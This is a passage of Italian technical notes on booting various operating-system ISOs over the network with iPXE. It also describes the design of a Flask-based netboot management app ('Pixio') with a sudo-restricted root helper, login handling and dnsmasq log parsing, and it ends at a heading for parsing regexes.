TrueNAS-SCALE-25.10.7.iso: /vmlinuz, /initrd.img, /live/filesystem.squashfs (243 MB), /TrueNAS-SCALE.update (2.0 GB); grub: 'linux /vmlinuz gfxpayload=text quiet nomodeset boot=live toram=filesystem.squashfs console=tty0'. Forum 30138: con 'boot=live fetch=http://.../TrueNAS-SCALE-24.10.1.iso' l'installer parte ma fallisce 'mount /cdrom/TrueNAS-SCALE.update ... failed'; workaround manuale (curl dell'.update in /run/truenas + symlink /cdrom/TrueNAS-SCALE.update) funziona. Docs ufficiali: nessun PXE.

Tails 7.12 /isolinux/live64.cfg: 'kernel /live/vmlinuz / append initrd=/live/initrd.img boot=live config live-media=removable nopersistence noprompt timezone=Etc/UTC splash noautologin module=Tails slab_nomerge slub_debug=FZ mce=0 vsyscall=none init_on_free=1 mds=full,nosmt page_alloc.shuffle=1 randomize_kstack_offset=on ... quiet'. Ticket #11044 'PXE Boot support': Rejected ('it is not a supported way of installation or booting'). tails.net: 'remove the live-media=removable boot option' (solo per dischi esterni). FOG 17190: netboot fallito ('boot arguments must include a root= parameter'), irrisolto.
```

### memtest86+ (Debian 7.20) e fallback memdisk/sanboot

*Fonte:* /usr/share/doc/memtest86+/README.Debian ; dpkg -L memtest86+ ; https://wiki.syslinux.org/wiki/index.php?title=MEMDISK ; https://github.com/ipxe/ipxe/discussions/962 ; https://github.com/ipxe/ipxe/discussions/476 ; https://ipxe.org/cmd/sanboot ; https://forums.fogproject.org/topic/17186/ — *confidenza:* alta

```
dpkg -L memtest86+: /boot/memtest86+ia32.bin /boot/memtest86+ia32.efi /boot/memtest86+x64.bin /boot/memtest86+x64.efi ; /usr/lib/memtest86+/memtest86+{ia32,x64}.iso (contengono /BOOT/FLOPPY.IMG e /EFI/BOOT/BOOTX64.EFI)
README.Debian: 'A legacy bios 64bit /boot/memtest86+x64.bin that uses Linux zImage boot protocol' ; 'A 64bit EFI Image /boot/memtest86+x64.efi'.
iPXE: bios -> kernel {http_boot}/memtest86+x64.bin ; efi -> chain {http_boot}/memtest86+x64.efi (FOG: 'if iseq ${platform} efi').
/usr/lib/syslinux/memdisk presente (syslinux-common 6.04). iPXE: kernel {http_boot}/memdisk iso raw ; initrd {http_isofile} ; boot.
Syslinux wiki MEMDISK: 'The majority of Linux-based ISO images will also fail to work with MEMDISK ISO emulation' (dopo il kernel 'the virtual CD will no longer be accessible'). iPXE #962 (maintainer): 'PXE binaries such as pxelinux.0 and memdisk use legacy BIOS calls and can never work on UEFI'; #476: 'As soon as the kernel starts up, the real-mode INT 13 interface provided by iPXE's sanboot or memdisk ceases to exist' ; 'Extract kernel and initrd and do proper netbooting, for windows use wimboot'. memdisk 32-bit -> ISO max ~2 GB.
ipxe.org/cmd/sanboot: 'sanboot [--drive <drive>] [--filename <filename>] [--extra <filename>] [--label <label>] [--uuid <uuid>] [--no-describe] [--keep] [<uri>]' es. 'sanboot http://boot.ipxe.org/freedos/fdfullcd.iso'; su UEFI --filename/--label selezionano il bootloader nella ESP.
```

### Trappole

- casper: url=/iso-url= DEVONO terminare in '.iso' (nessuna query string) e serve ip=dhcp; l'intera ISO viene scaricata in RAM (Desktop 24.04 = 6.6 GB -> >= 8 GB RAM). Kernel e initrd devono venire dalla stessa ISO (check casper-uuid).
- Aggiungere sempre 'initrd=initrd.magic' alla cmdline per UEFI (iPXE cmd/initrd: obbligatorio con kernel < 5.7); con più 'initrd' iPXE li concatena in initrd.magic e il secondo argomento del comando 'initrd' è il nome del file nel cpio (usato per proxmox.iso e per preseed.cfg).
- {http_iso} per archiso_http_srv= DEVE avere lo slash finale; per inst.stage2/install= puntare alla radice della ISO montata.
- Fedora 42+/44 Workstation Live NON ha images/pxeboot (build kiwi): kernel/initrd in boot/x86_64/loader/. Distinguere dalla Live openSUSE (stesso layout kiwi): Fedora ha EFI/fedora/, openSUSE ha EFI/BOOT/MokManager.efi; openSUSE Live vuole root=live:<ISO intera>, Fedora root=live:.../LiveOS/squashfs.img.
- Le boot ISO RHEL-like (Alma 9 boot) non hanno .treeinfo né repo: usare solo inst.stage2={http_iso} (fallback images/install.img) e un mirror per inst.repo; le ISO DVD/minimal hanno .treeinfo e funzionano con inst.repo={http_iso}.
- Debian live 13.6 ha sia live/vmlinuz sia live/vmlinuz-<ver>; Clonezilla e GParted hanno .disk/info identico ('Debian GNU/Linux none "Sid"...'): usare i file marker Clonezilla-Live-Version / GParted-Live-Version. Le opzioni 'noeject vga=788' del vecchio GParted non sono più nel cfg 1.8.1.
- Arch 2026.09 non contiene più intel-ucode.img/amd-ucode.img: la ricetta deve caricarli solo se esistono (SystemRescue li ha ancora). EndeavourOS Cassini 22.12 ha rotto il boot HTTP (manca ipconfig) - dipende dalla release.
- Proxmox: non basta kernel+initrd, serve 'initrd {http_isofile} proxmox.iso' (l'init cerca /proxmox.iso) e ramdisk_size=16777216; RAM >= 4 GB. PXE legacy (pxelinux) fallisce con initrd grandi, iPXE ok.
- ESXi: BIOS non fattibile con iPXE (serve pxelinux 3.86 + mboot.c32); UEFI richiede mboot.efi estratto dalla ISO e boot.cfg rigenerato (prefix=, slash tolti, cdromBoot rimosso) servito da {http_boot}. Layout ISO non verificabile (nessuna ISO pubblica): confrontare i nomi case-insensitive.
- memdisk: solo BIOS, ISO < ~2 GB, inutile per ISO Linux (il CD emulato sparisce dopo il kernel); sanboot HTTP: El Torito no-emulation only, stessa limitazione -> mostrare avviso in GUI e usarli solo per DOS/tool/memtest.
- Tails: non avviabile via rete (PXE rifiutato upstream, initrd senza driver di rete, live-media=removable) -> marcare 'non supportato'. TrueNAS: installer parte con fetch=<iso> ma l'installazione può fallire su /cdrom/TrueNAS-SCALE.update -> 'sperimentale', RAM >= 8 GB.
- Molte fonti ufficiali bloccano i fetch automatici (Anubis/Cloudflare: wiki.archlinux.org, wiki.alpinelinux.org, docs.fedoraproject.org, en.opensuse.org, salsa/gitlab.archlinux.org, sourceforge, clonezilla.org): ho usato mirror GitHub/raw, deb.debian.org, free.nchc.org.tw e le ISO reali; i file scaricati (casper scripts, live-boot deb, dracut livenet, mkinitfs, modloop.initd, alpine boot.ipxe) restano in /var/tmp/pixio-recipes (ISO cancellate).

### Domande aperte

- Pop!_OS: il fork di casper accetta url=*.iso come Ubuntu? Non testato a runtime (solo layout verificato).
- Kali live: layout live/{vmlinuz,initrd.img} confermato solo da doc offsec (ISO 2026.2 non scaricabile da cdimage.kali.org durante la verifica); eventuali parametri extra (username=kali hostname=kali) da leggere dal live.cfg della ISO.
- Alpine alpine_repo={http_iso}/apks: apk dovrebbe aggiungere /x86_64/APKINDEX.tar.gz al base URL (layout standard) ma non è stato provato a runtime; in alternativa usare il mirror ufficiale.
- d-i con initrd 'cdrom' via rete: si aspetta che cdrom-detect fallisca e d-i chieda il mirror; se si vuole un flusso pulito usare l'initrd netboot dal mirror o preseed (da testare in QEMU).
- ESXi: la sintassi esatta iPXE 'kernel .../mboot.efi -c .../boot.cfg' non è riportata testualmente nella pagina Broadcom (che documenta pxelinux/mboot.c32 e il flusso UEFI HTTP nativo); da testare con una ISO ESXi reale.
- Manjaro (miso*: misobasedir=manjaro, miso_http_srv=?) e Zorin/elementary: ricette non verificate su ISO reale; consigliato 'sperimentale'.
- Rescuezilla: qualche script iPXE in giro usa 'netboot=url url=...filesystem.squashfs', ma con il casper attuale (url=*.iso) l'unica forma coerente è url=<ISO>; da testare.
- RAM: i valori sono stime (dimensione file scaricato in RAM + margine), non testati con boot reali in QEMU (nessun KVM sulla macchina).

## Architettura Flask "Pixio" su Debian 13 (solo pacchetti Debian): privilegi/helper sudo, login, log live, parsing dnsmasq, struttura progetto, sicurezza web, endpoint pubblici

Versioni verificate sulla macchina: python3 3.13.5, python3-flask 3.1.1, python3-werkzeug 3.1.3, python3-jinja2 3.1.6, gunicorn 23.0.0, python3-psutil 7.0.0, sudo 1.9.16p2, systemd 257, dnsmasq 2.91; polkitd/pkexec NON installati; gevent/eventlet/tornado NON importabili (solo worker sync e gthread utilizzabili).
NOTA: /opt/pixio contiene già un'implementazione funzionante (pixio.service attivo come utente pixio, helper /usr/local/sbin/pixio-helper root:root 755, sudoers /etc/sudoers.d/pixio, dnsmasq che logga su /var/log/pixio/dnsmasq.log con log-dhcp). Le raccomandazioni sotto confermano quel disegno e indicano i punti da rifinire.
1) Privilegi: raccomandata (b) utente 'pixio' + helper Python invocato via sudo NOPASSWD limitato a UN solo eseguibile root-owned, con validazione argomenti nell'helper e (opzionale) regex sugli argomenti nel sudoers. (a) root è rischioso (RCE web = root). (c) polkit richiede installare polkitd, copre solo systemd (manage-units) e NON mount/loop-mount/scrittura config; systemd-run come non-root richiede comunque manage-units = root de facto.
2) Login: SECRET_KEY da /etc/pixio/secret (0600, 64 hex), generate_password_hash default 'scrypt:32768:8:1' in werkzeug 3.1.3 (hashlib.scrypt disponibile, verificato), reset via CLI, rate limit in memoria (ok con 1 worker).
3) Log live: gunicorn 23 ha solo sync+gthread senza pacchetti extra; SSE funziona con gthread ma occupa 1 thread per client e nginx va configurato (proxy_buffering off, già presente). Raccomandato polling ogni 2 s su /api/logs?cursor= (già implementato).
4) Formato reale log dnsmasq 2.91 con log-dhcp: "%u %s(%s) %s%s%s %s%s" -> "xid TYPE(iface) [ip ]mac [string][err]"; in proxyDHCP la riga è "PXE(ens18) 6c:1f:f7:bc:09:87 proxy" (MAC PRIMA della stringa, l'IP viene PRIMA del MAC quando c'è). Arch da "vendor class: PXEClient:Arch:00007:UNDI:003016" e da "tags: efi64, ipxe, ens18". Regex fornite.
5-7) Struttura, storage atomico (fcntl.flock + os.replace), job in thread, gunicorn --workers 1 --threads 8, CSRF token in sessione, cookie HttpOnly/SameSite=Lax, before_request con allowlist prefissi pubblici (/boot.ipxe, /boot/, /api/health, /api/auth/status, /api/auth/login, /static/).

### 1. Confronto opzioni privilegi (a/b/c) e raccomandazione

*Fonte:* man sudoers (sudo 1.9.16p2), man systemd.exec, man capabilities, man org.freedesktop.systemd1 sez. Security; dpkg -s polkitd; /etc/sudoers — *confidenza:* alta

```
(a) gunicorn come root: nessun confine; una RCE/SSRF/path-traversal nella GUI = root immediato; ProtectSystem/NoNewPrivileges inapplicabili perché l'app deve davvero fare mount. SCONSIGLIATA.

(b) utente 'pixio' + helper via sudo NOPASSWD (RACCOMANDATA per LAN aziendale):
- superficie privilegiata = un solo file, ~800 righe, argomenti validati con regex/realpath, nessun testo libero dalla GUI (le config vengono renderizzate NELL'helper da /etc/pixio/config.json e validate con dnsmasq --test / nginx -t / testparm prima del restart).
- sudo logga ogni invocazione in syslog/journal (audit gratis).
- requisiti: helper e directory che lo contiene root:root, non scrivibili da pixio (verificato: /usr/local/sbin/pixio-helper root:root 755, /opt/pixio root:root 755); sudoers con path assoluto; env_reset + secure_path attivi (default Debian, verificato in /etc/sudoers).
- costo: ogni chiamata è un fork di sudo+python (~50-100 ms), accettabile per operazioni amministrative.

(c) utente pixio + polkit/systemd-run:
- polkitd/pkexec NON sono installati su questa macchina (dpkg -s polkitd -> 'non è installato').
- polkit copre SOLO le azioni D-Bus (org.freedesktop.systemd1.manage-units: default auth_admin, verificato in /usr/share/polkit-1/actions/org.freedesktop.systemd1.policy). Non copre mount(2)/loop (CAP_SYS_ADMIN, man capabilities), né scrivere /etc/dnsmasq.d, /etc/nginx, /etc/samba, né /etc/pixio/sources/*.cred.
- 'systemd-run' da utente non privilegiato con manage-units concesso = può avviare unità transient come root => equivale a root senza validazione argomenti. Servirebbe comunque un helper. SCONSIGLIATA.

Hardening extra consigliato per pixio.service (systemd 257): NoNewPrivileges=NO (deve poter fare sudo!), quindi usare invece: ProtectHome=yes, PrivateTmp=yes, ProtectKernelTunables=yes, ProtectControlGroups=yes, RestrictSUIDSGID=no (sudo è setuid), UMask=0022. Non usare ProtectSystem=strict/NoNewPrivileges perché bloccano sudo.
```

### 1. File sudoers esatto (/etc/sudoers.d/pixio, mode 0440, validare con visudo -cf)

*Fonte:* man -P cat sudoers (sezioni 'Regular expressions', 'Wildcards in command arguments', 'requiretty', 'use_pty'); /etc/sudoers.d/pixio esistente — *confidenza:* alta

```
# Pixio: l'utente del servizio può eseguire SOLO l'helper privilegiato
Defaults:pixio !requiretty
Defaults!/usr/local/sbin/pixio-helper !use_pty, !mail_badpass
pixio ALL=(root) NOPASSWD: /usr/local/sbin/pixio-helper

# --- Variante 'difesa in profondità' con regex POSIX ERE sugli argomenti (sudo >= 1.9.10; installato 1.9.16p2):
# (una sola riga per Cmnd; la regex deve iniziare con ^ e finire con $; gli argomenti sono confrontati come unica stringa)
# pixio ALL=(root) NOPASSWD: /usr/local/sbin/pixio-helper ^(mount-all|list-mounts|chown-library|samba-password|windows-share-password)$, \
#   /usr/local/sbin/pixio-helper ^(mount-cifs|umount-cifs|remove-source|test-cifs|write-source) [a-z0-9][a-z0-9_-]{0,31}$, \
#   /usr/local/sbin/pixio-helper ^(mount-iso|mount-detect) [a-z0-9][a-z0-9._-]{0,63} /srv/pixio/(sources|library|cache)/[^ ]+$, \
#   /usr/local/sbin/pixio-helper ^(umount-iso|umount-detect) [a-z0-9][a-z0-9._-]{0,63}$, \
#   /usr/local/sbin/pixio-helper ^(apply|render) (dnsmasq|nginx|samba|all)$, \
#   /usr/local/sbin/pixio-helper ^service (dnsmasq|nginx|smbd|nmbd|pixio-mounts) (start|stop|restart|reload|status|enable|disable)$, \
#   /usr/local/sbin/pixio-helper ^rebuild-ipxe [0-9.]{7,15}$, \
#   /usr/local/sbin/pixio-helper ^power (reboot|poweroff)$

Note dal man: 'Command line arguments can include wildcards or be a regular expression that starts with ^ and ends with $'; 'Unless a regular expression is specified, the following characters must be escaped with a \ if they are used in command arguments: , : = \'; 'Command line arguments are matched as a single, concatenated string' (quindi le wildcard * attraversano gli spazi: preferire regex). requiretty è off di default su Debian (la riga è innocua); use_pty 'If the sudo process is not attached to a terminal, use_pty has no effect'.
Installazione: install -m 440 sudoers-pixio /etc/sudoers.d/pixio && visudo -cf /etc/sudoers.d/pixio. Dall'app invocare sempre 'sudo -n /usr/local/sbin/pixio-helper ...' (-n = mai prompt).
```

### 1. Scheletro dell'helper (argparse con sottocomandi, validazione, JSON su stdout)

*Fonte:* /opt/pixio/helper/pixio-helper (esistente, 787 righe) + man mount.cifs (credentials=, uid=, file_mode=, cache=, soft), man mount ('-o loop'), python3 -h (-I) — *confidenza:* alta

```
#!/usr/bin/python3 -I
# -I = isolated mode: ignora PYTHONPATH/PYTHONSTARTUP e la cwd (difesa in più oltre a env_reset di sudo)
import argparse, ipaddress, json, os, re, subprocess, sys, fcntl, pwd, grp
from contextlib import contextmanager

SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{0,63}$")
SOURCE_ID_RE = re.compile(r"^[a-z0-9][a-z0-9_-]{0,31}$")
UNC_RE = re.compile(r"^//[A-Za-z0-9._-]+(/[^/\\\x00-\x1f]+)+$")
ISO_ROOTS = ("/srv/pixio/sources", "/srv/pixio/library", "/srv/pixio/cache")
SERVICES = {"dnsmasq": "dnsmasq.service", "nginx": "nginx.service", "smbd": "smbd.service"}
CONFIG_TARGETS = {"dnsmasq": "/etc/dnsmasq.d/pixio.conf", "nginx": "/etc/nginx/sites-available/pixio", "samba": "/etc/samba/smb.conf"}

class HelperError(Exception): pass

def out(obj): print(json.dumps(obj, ensure_ascii=False))

def run(cmd, check=True, input_text=None, timeout=120):
    p = subprocess.run(cmd, capture_output=True, text=True, input=input_text, timeout=timeout)  # MAI shell=True
    if check and p.returncode != 0:
        raise HelperError(f"{' '.join(cmd)}: {p.stderr.strip() or p.stdout.strip() or 'exit '+str(p.returncode)}")
    return p

def check_slug(s):
    if not SLUG_RE.match(s or ""): raise HelperError(f"slug non valido: {s!r}")
    return s

def resolve_iso_path(path):
    rp = os.path.realpath(path)            # risolve symlink e '..' PRIMA del confronto
    if not any(rp == r or rp.startswith(r + "/") for r in ISO_ROOTS):
        raise HelperError("percorso ISO fuori dalle cartelle consentite")
    if not os.path.isfile(rp): raise HelperError("file ISO non trovato")
    return rp

def is_mounted(path):
    path = os.path.realpath(path)
    with open("/proc/self/mounts") as f:
        return any(len(p := l.split()) > 1 and p[1].replace("\\040", " ") == path for l in f)

@contextmanager
def slug_lock(slug):                      # serializza mount/umount concorrenti sulla stessa ISO
    os.makedirs("/run/pixio/lock", exist_ok=True)
    fd = os.open(f"/run/pixio/lock/{slug}.lock", os.O_RDWR | os.O_CREAT, 0o600)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX); yield
    finally:
        fcntl.flock(fd, fcntl.LOCK_UN); os.close(fd)

def write_file(path, content, mode=0o644):   # scrittura atomica
    tmp = path + ".pixio-new"
    with open(os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode), "w") as f: f.write(content)
    os.chmod(tmp, mode); os.replace(tmp, path)

# ---- sottocomandi
def cmd_mount_cifs(a):      # legge definizione+cred da /etc/pixio/sources/<id>.{json,cred} (root 0600), mai da argv
    sid = check_source_id(a.source_id); d = source_def(sid); mp = f"/srv/pixio/sources/{sid}"
    os.makedirs(mp, exist_ok=True)
    if is_mounted(mp): return out({"ok": True, "already": True})
    uid, gid = pwd.getpwnam("pixio").pw_uid, grp.getgrnam("pixio").gr_gid
    opts = [f"credentials=/etc/pixio/sources/{sid}.cred", "ro", f"uid={uid}", f"gid={gid}", "file_mode=0444", "dir_mode=0555",
            "iocharset=utf8", "noperm", "soft", "echo_interval=30", "actimeo=30", "cache=strict"]
    if d.get("guest"): opts.append("guest")
    if d.get("vers"): opts.append(f"vers={d['vers']}")
    run(["mount", "-t", "cifs", d["unc"], mp, "-o", ",".join(opts)], timeout=60)
    out({"ok": True, "mountpoint": mp})

def cmd_umount_cifs(a): ...   # prima smonta le ISO in loop sotto la sorgente, poi umount, fallback umount -l

def cmd_mount_iso(a):
    slug = check_slug(a.slug); rp = resolve_iso_path(a.path); mp = f"/srv/pixio/http/iso/{slug}"
    with slug_lock(slug):
        os.makedirs(mp, exist_ok=True)
        while is_mounted(mp): run(["umount", mp], check=False)
        # Windows ISO: provare prima udf (install.wim >4GB visibile solo nella vista UDF), poi autodetect
        for cmd in (["mount", "-t", "udf", "-o", "loop,ro,mode=0444,dmode=0555", rp, mp],
                    ["mount", "-o", "loop,ro,mode=0444,dmode=0555", rp, mp], ["mount", "-o", "loop,ro", rp, mp]):
            if run(cmd, check=False, timeout=60).returncode == 0: break
        else: raise HelperError("mount ISO fallito")
        link = f"/srv/pixio/http/isofile/{slug}.iso"
        try: os.unlink(link)
        except FileNotFoundError: pass
        os.symlink(rp, link)
    out({"ok": True, "mountpoint": mp, "isofile": link})

def cmd_umount_iso(a): ...

def cmd_write_config(a):    # 'apply <service>': render DALLA config validata, test, rollback, restart
    cfg = load_config(); what = a.service
    content = {"dnsmasq": render_dnsmasq, "nginx": render_nginx, "samba": render_smb}[what](cfg)
    target = CONFIG_TARGETS[what]; old = open(target).read() if os.path.exists(target) else None
    write_file(target, content)
    test = {"dnsmasq": ["dnsmasq", "--test", "-C", "/etc/dnsmasq.conf"], "nginx": ["nginx", "-t"], "samba": ["testparm", "-s", target]}[what]
    p = run(test, check=False)
    if p.returncode != 0:
        if old is not None: write_file(target, old)
        raise HelperError(f"config {what} non valida: {p.stderr.strip()}")
    run(["systemctl", "reload-or-restart" if what != "dnsmasq" else "restart", SERVICES[what if what != 'samba' else 'smbd']])
    out({"ok": True, "file": target})

def cmd_restart(a):
    unit = SERVICES.get(a.service) or (_ for _ in ()).throw(HelperError("servizio non gestito"))
    if a.action not in ("start", "stop", "restart", "reload"): raise HelperError("azione non valida")
    run(["systemctl", a.action, unit]); out({"ok": True})

def cmd_copy_iso(a):        # copia sorgente->cache come utente pixio: NON serve root se /srv/pixio/cache è di pixio.
    ...                     # Meglio farla nell'app (thread + job) con shutil.copyfileobj a blocchi da 8-16 MiB e progress.

def main():
    if os.geteuid() != 0: out({"error": "deve girare come root (via sudo)"}); sys.exit(2)
    ap = argparse.ArgumentParser(prog="pixio-helper", allow_abbrev=False)
    sp = ap.add_subparsers(dest="cmd", required=True)
    p = sp.add_parser("mount-cifs");  p.add_argument("source_id"); p.set_defaults(fn=cmd_mount_cifs)
    p = sp.add_parser("umount-cifs"); p.add_argument("source_id"); p.set_defaults(fn=cmd_umount_cifs)
    p = sp.add_parser("mount-iso");   p.add_argument("slug"); p.add_argument("path"); p.set_defaults(fn=cmd_mount_iso)
    p = sp.add_parser("umount-iso");  p.add_argument("slug"); p.set_defaults(fn=cmd_umount_iso)
    p = sp.add_parser("write-config"); p.add_argument("service", choices=["dnsmasq", "nginx", "samba"]); p.set_defaults(fn=cmd_write_config)
    p = sp.add_parser("restart"); p.add_argument("service", choices=list(SERVICES)); p.add_argument("action", nargs="?", default="restart"); p.set_defaults(fn=cmd_restart)
    p = sp.add_parser("copy-iso"); p.add_argument("path"); p.add_argument("dest"); p.set_defaults(fn=cmd_copy_iso)
    a = ap.parse_args()
    try: a.fn(a)
    except HelperError as e: out({"error": str(e)}); sys.exit(1)
    except subprocess.TimeoutExpired as e: out({"error": f"timeout: {e}"}); sys.exit(1)

if __name__ == "__main__": main()

# Lato app (pixio/privileged.py): subprocess.run(["sudo","-n","/usr/local/sbin/pixio-helper",*args], capture_output=True, text=True, input=stdin_json, timeout=180); parse ultima riga JSON; HelperError se exit!=0 o 'error'.
# Segreti (password CIFS/Samba) passano SEMPRE via stdin (JSON o riga), MAI in argv (visibili in /proc/*/cmdline e nel log di sudo).
```

### 2. Login: secret, hash password (werkzeug 3.1.3 default scrypt), CLI reset, rate limit

*Fonte:* /usr/lib/python3/dist-packages/werkzeug/security.py; /usr/lib/python3/dist-packages/flask/app.py (default_config); https://flask.palletsprojects.com/en/stable/web-security/ ; /opt/pixio/pixio/auth.py — *confidenza:* alta

```
# werkzeug/security.py (installato 3.1.3):
def generate_password_hash(password: str, method: str = "scrypt", salt_length: int = 16) -> str:
    """... ``scrypt``, the default. The parameters are ``n``, ``r``, and ``p``, the default is ``scrypt:32768:8:1``. See :func:`hashlib.scrypt`."""
DEFAULT_PBKDF2_ITERATIONS = 1_000_000
# verifica pratica: generate_password_hash('test') -> 'scrypt:32768:8:1$OzNQ9JdSbZ1hnVWJ$1fc3a0...' ; hashlib.scrypt disponibile (OpenSSL) su python 3.13.5 Debian.

# secret key (auth.py):
def secret_key():
    try:
        with open("/etc/pixio/secret") as f:
            k = f.read().strip()
            if len(k) >= 32: return k
    except FileNotFoundError: pass
    k = secrets.token_hex(32)
    with open(os.open("/etc/pixio/secret", os.O_WRONLY|os.O_CREAT|os.O_TRUNC, 0o600), "w") as f: f.write(k)
    return k
# (verificato: /etc/pixio/secret 0600 pixio:pixio, 64 byte). In install.sh crearlo con: install -m 600 -o pixio -g pixio /dev/null /etc/pixio/secret && python3 -c 'import secrets;print(secrets.token_hex(32))' > /etc/pixio/secret

# Flask config (app factory) – default Flask 3.1.1 verificati in flask/app.py: SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE=None, SESSION_COOKIE_SECURE=False, PERMANENT_SESSION_LIFETIME=31 giorni, MAX_FORM_MEMORY_SIZE=500_000, MAX_FORM_PARTS=1_000
app.config.update(SECRET_KEY=auth.secret_key(), SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Lax",
                  SESSION_COOKIE_NAME="pixio_session", PERMANENT_SESSION_LIFETIME=datetime.timedelta(hours=12))
# Login: session.clear(); session["user"]="admin"; session.permanent=True  (doc Flask: 'validates that the cryptographic signature is not older than this value')

# Rate limit in memoria (valido SOLO con --workers 1):
_attempts = {}; _lock = threading.Lock(); MAX_ATTEMPTS = 8; WINDOW = 300
def _rate_limited(ip):
    now = time.time()
    with _lock:
        lst = [t for t in _attempts.get(ip, []) if now - t < WINDOW]; _attempts[ip] = lst
        return len(lst) >= MAX_ATTEMPTS
# ip = request.remote_addr con ProxyFix(app.wsgi_app, x_for=1, x_proto=1) perché nginx è l'unico proxy davanti (altrimenti tutti i login arrivano da 127.0.0.1 e il limite è globale).
# Aggiunta consigliata: pulizia periodica del dict (evita crescita) e limite globale (es. 30 tentativi/5 min da qualsiasi IP) contro spoofing X-Forwarded-For (impossibile se solo nginx parla con :8080, verificare bind 127.0.0.1).

# CLI reset (bin/pixio-admin set-password): legge la password con read -s e la passa a python come argv -> VISIBILE in /proc/<pid>/cmdline per la durata (breve). Meglio: passarla via stdin:
#   printf '%s\n' "$PW" | sudo -u pixio python3 -c 'import sys;sys.path.insert(0,"/opt/pixio");from pixio import auth;auth.set_password(sys.stdin.readline().rstrip("\n"))'
```

### 3. Log live: worker gunicorn 23 disponibili e raccomandazione polling vs SSE

*Fonte:* /usr/lib/python3/dist-packages/gunicorn/workers/__init__.py, config.py, workers/gthread.py, workers/sync.py; /etc/systemd/system/pixio.service; /opt/pixio/etc/nginx-pixio.conf.tpl — *confidenza:* alta

```
Worker registrati in gunicorn 23 (gunicorn/workers/__init__.py): sync, eventlet, gevent, gevent_wsgi, gevent_pywsgi, tornado, gthread. Su questa macchina: import gevent/eventlet/tornado -> ModuleNotFoundError => utilizzabili SOLO 'sync' e 'gthread' (gthread usa concurrent.futures della stdlib).

Doc integrata (gunicorn/config.py):
- threads: 'This setting only affects the Gthread worker type. If you try to use the sync worker type and set the threads setting to more than 1, the gthread worker type will be used instead.' (config.py:109-121) => '--workers 1 --threads 8' equivale a '-k gthread'.
- timeout (default 30): 'Workers silent for more than this many seconds are killed and restarted ... For the non sync workers it just means that the worker process is still communicating and is not tied to the length of time required to handle a single request.'
- worker_connections (default 1000): 'This setting only affects the gthread, eventlet and gevent worker types.'
- keepalive (default 2): 'sync worker does not support persistent connections'.

Verifica nel sorgente gthread.py: il loop principale chiama self.notify() ogni ~1 s (run(): 'while self.alive: self.notify() ... events = self.poller.select(1.0)') indipendentemente dalle richieste in corso nel thread pool => una risposta streaming (SSE) lunga NON fa scattare il timeout del worker; con 'sync' invece notify() avviene solo tra una richiesta e l'altra => una SSE >timeout uccide il worker.

SSE con gthread: fattibile (Response(gen(), mimetype='text/event-stream') + nginx proxy_buffering off — già presente nel template nginx — + header X-Accel-Buffering: no), MA ogni tab aperta occupa stabilmente 1 degli 8 thread finché il browser non chiude; 3-4 admin con più tab saturano il pool e le API restano bloccate. Mitigazioni (max SSE concorrenti, threads=16) complicano.

RACCOMANDAZIONE: polling ogni 2 s via fetch('/api/logs?source=all&cursor=<c>&limit=200') -> {lines:[{ts,source,level,msg}], cursor}. Costo: 1 richiesta breve ogni 2 s per tab, nessun thread bloccato, nessun problema di timeout/proxy, riprende da solo dopo restart dell'app. È esattamente quanto già implementato in pixio/services/logs.py (cursore 'ts|n' che gestisce più righe nello stesso secondo) e blueprints/api_logs.py.

Comando gunicorn (pixio.service esistente, ok): /usr/bin/gunicorn --bind 127.0.0.1:8080 --workers 1 --threads 8 --timeout 600 --access-logfile - --error-logfile - wsgi:app
(--timeout 600 serve per upload chunk/scansioni lunghe; con gthread non è un timeout di richiesta ma un heartbeat).
```

### 4. Formato reale delle righe dnsmasq 2.91 e regex di parsing

*Fonte:* strings /usr/sbin/dnsmasq; sorgente upstream rfc2131.c (log_packet, mirror github imp/dnsmasq); /var/log/pixio/dnsmasq.log; man journalctl; man systemd.journal-fields; /opt/pixio/pixio/services/logs.py e clients.py — *confidenza:* alta

```
Formato in rfc2131.c log_packet() — stringa presente nel binario installato (strings /usr/sbin/dnsmasq): con --log-dhcp: "%u %s(%s) %s%s%s %s%s" -> args: xid, type, interface, addrbuff(ip o ''), (addr?' ':''), namebuff(mac), string, err. Senza --log-dhcp: identico senza 'xid '.
=> ordine: TYPE(iface) [IP ]MAC [STRING][ERR]. ATTENZIONE: l'IP viene PRIMA del MAC (l'esempio 'PXE(ens18) aa:bb:.. 10.10.0.55 undionly.kpxe' della domanda è invertito).
Call site verificate (sorgente upstream): proxyDHCP -> log_packet("PXE", NULL, emac, ..., ignore ? "proxy-ignored" : "proxy", NULL, xid)  => 'PXE(ens18) 6c:1f:f7:bc:09:87 proxy' ; DHCP completo con pxe-service -> log_packet("PXE", &mess->yiaddr, emac, ..., (char *)mess->file, NULL, xid) => 'PXE(ens18) 10.10.0.55 6c:1f:... undionly.kpxe'. DHCPDISCOVER logga l'IP richiesto (option 50) se presente; DHCPOFFER/REQUEST/ACK loggano yiaddr; DHCPACK aggiunge hostname come string.
Altre righe (solo con log-dhcp, stesso xid): '%u vendor class: %s', '%u user class: %s', '%u tags: %s', '%u client provides name: %s', '%u bootfile name: %s', '%u next server: %s', '%u requested options: %s', '%u sent size:%3d option:%3d %s  %s', '%u available DHCP subnet: %s/%s'.

Righe reali da /var/log/pixio/dnsmasq.log (log-facility, formato syslog 'Mon DD HH:MM:SS dnsmasq-dhcp[pid]: '):
Sep  8 18:59:05 dnsmasq-dhcp[114296]: 2349951939 vendor class: PXEClient:Arch:00007:UNDI:003016
Sep  8 18:59:05 dnsmasq-dhcp[114296]: 2349951939 PXE(ens18) 6c:1f:f7:bc:09:87 proxy
Sep  8 18:59:05 dnsmasq-dhcp[114296]: 2349951939 tags: efi64, ens18
Sep  8 18:59:05 dnsmasq-dhcp[114296]: 2349951939 bootfile name: ipxe.efi
Sep  8 18:59:05 dnsmasq-dhcp[114296]: 2349951939 next server: 10.10.0.254
Sep  8 18:59:14 dnsmasq-dhcp[114296]: 119414620 user class: iPXE
Sep  8 18:59:14 dnsmasq-dhcp[114296]: 119414620 tags: efi64, ipxe, ens18
Sep  8 18:56:17 dnsmasq-dhcp[114296]: 1907165498 vendor class: HTTPClient:Arch:00016:UNDI:003016
Sep  8 18:52:29 dnsmasq-dhcp[114296]: 116984711 vendor class: MSFT 5.0

REGEX (Python re):
